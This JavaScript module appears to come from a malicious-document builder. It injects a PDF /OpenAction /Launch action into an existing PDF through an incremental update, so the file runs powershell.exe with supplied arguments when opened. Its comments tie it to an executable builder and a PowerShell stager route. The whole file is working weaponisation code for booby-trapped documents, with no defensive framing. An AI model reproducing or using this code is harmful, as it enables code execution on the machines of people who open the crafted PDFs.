"use strict";

/**
 * Shared PDF /Launch injection utilities.
 * Used by both routes/builder.js (exe-based) and routes/stage.js (PS1 stager).
 */

function findObjInXref(pdfStr, xrefOff, objNum) {
  const lines = pdfStr.slice(xrefOff).split(/\r?\n/);
  let li = 0;
  if (lines[li].trim() === "xref") li++;
  while (li < lines.length) {
    const hdr = lines[li].trim();
    if (hdr === "trailer" || hdr.startsWith("<<")) break;
    const sub = hdr.match(/^(\d+)\s+(\d+)$/);
    if (!sub) { li++; continue; }
    const first = parseInt(sub[1]), count = parseInt(sub[2]);
    li++;
    for (let k = 0; k < count; k++, li++) {
      const m = (lines[li] || "").match(/^(\d{10})\s+\d{5}\s+([nf])/);
      if (!m) { k--; continue; }
      if (first + k === objNum && m[2] === "n") return parseInt(m[1]);
    }
  }
  return -1;
}

/**
 * Appends an incremental update to pdfBuf that adds /OpenAction /Launch.
 * psArgs is the raw /P string value (pre-escaped for PDF literal syntax).
 */
function injectLaunchIntoPdf(pdfBuf, psArgs) {
  const pdf = pdfBuf.toString("latin1");

  const sxAll = [...pdf.matchAll(/startxref\s*\r?\n\s*(\d+)/g)];
  if (!sxAll.length) throw new Error("No startxref — is this a valid PDF?");
  const origXrefOff = parseInt(sxAll[sxAll.length - 1][1]);

  if (!pdf.slice(origXrefOff, origXrefOff + 5).trimStart().startsWith("xref")) {
    throw new Error(
      "This PDF uses cross-reference streams (PDF 1.5+). " +
      "Re-save as PDF 1.4 in Acrobat (Save As → PDF 1.4) or LibreOffice " +
      "(Export as PDF → Compatibility: PDF 1.4), then upload again."
    );
  }

  const trailerM = pdf.slice(origXrefOff).match(/trailer\s*<<([\s\S]*?)>>/);
  if (!trailerM) throw new Error("Could not find PDF trailer dict");
  const tb = trailerM[1];
  const rootM = tb.match(/\/Root\s+(\d+)\s+0\s+R/);
  const sizeM = tb.match(/\/Size\s+(\d+)/);
  if (!rootM || !sizeM) throw new Error("Trailer missing /Root or /Size");

  const catNum    = parseInt(rootM[1]);
  const origSize  = parseInt(sizeM[1]);
  const newActNum = origSize;

  const catOff = findObjInXref(pdf, origXrefOff, catNum);
  if (catOff < 0) throw new Error("Catalog object not found in xref table");

  const catSrc = pdf.slice(catOff);
  const catM   = catSrc.match(/^\d+\s+0\s+obj\s*(<<[\s\S]*?>>)\s*(?:stream|endobj)/);
  if (!catM) throw new Error("Could not parse catalog dict");

  let catDict = catM[1];
  catDict = catDict.replace(/\/OpenAction\s+\d+\s+0\s+R\s*/g, "");
  catDict = catDict.replace(/>>\s*$/, `/OpenAction ${newActNum} 0 R\n>>`);

  const sep    = "\n";
  const updCat = `${catNum} 0 obj\n${catDict}\nendobj\n\n`;
  const actObj =
    `${newActNum} 0 obj\n` +
    `<< /Type /Action /S /Launch\n` +
    `   /Win << /F (powershell.exe)\n` +
    `           /P (${psArgs})\n` +
    `           /D (C:\\\\Windows\\\\System32) >> >>\n` +
    `endobj\n\n`;

  const base  = pdfBuf.length + Buffer.byteLength(sep, "latin1");
  const catAt = base;
  const actAt = base + Buffer.byteLength(updCat, "latin1");
  const xrAt  = actAt + Buffer.byteLength(actObj, "latin1");

  const objs = [{ n: catNum, o: catAt }, { n: newActNum, o: actAt }]
    .sort((a, b) => a.n - b.n);

  let xrSec = "xref\n";
  let i = 0;
  while (i < objs.length) {
    let j = i;
    while (j + 1 < objs.length && objs[j + 1].n === objs[j].n + 1) j++;
    xrSec += `${objs[i].n} ${j - i + 1}\n`;
    for (let k = i; k <= j; k++)
      xrSec += objs[k].o.toString().padStart(10, "0") + " 00000 n \n";
    i = j + 1;
  }

  const trailer =
    `trailer\n<< /Size ${origSize + 1} /Root ${catNum} 0 R /Prev ${origXrefOff} >>\n` +
    `startxref\n${xrAt}\n%%EOF\n`;

  return Buffer.concat([
    pdfBuf,
    Buffer.from(sep,    "latin1"),
    Buffer.from(updCat, "latin1"),
    Buffer.from(actObj, "latin1"),
    Buffer.from(xrSec + trailer, "latin1"),
  ]);
}

module.exports = { findObjInXref, injectLaunchIntoPdf };
